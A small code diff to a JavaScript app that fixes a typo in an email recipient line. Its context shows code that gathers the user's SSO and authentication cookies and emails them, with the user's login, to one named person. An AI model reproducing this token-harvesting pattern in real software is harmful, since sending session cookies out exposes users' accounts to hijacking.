@@ -103,7 +103,7 @@ var myApp = {
                 body += '<b>ssoToken:</b>&nbsp;' + myApp.getCookie('!lithiumSSO') + "<br />";
                 body += '<b>UBIC_AUTH:</b>&nbsp;' + myApp.getCookie('UBIC_AUTH') + "<br />";
                 myApp.sendEmail(data.response.user, {
-                    to: 'david.esposito@ubnt.com',s
+                    to: 'david.esposito@ubnt.com',
                     subject: 'Info for ' + user.login,
                     body: body
                 })
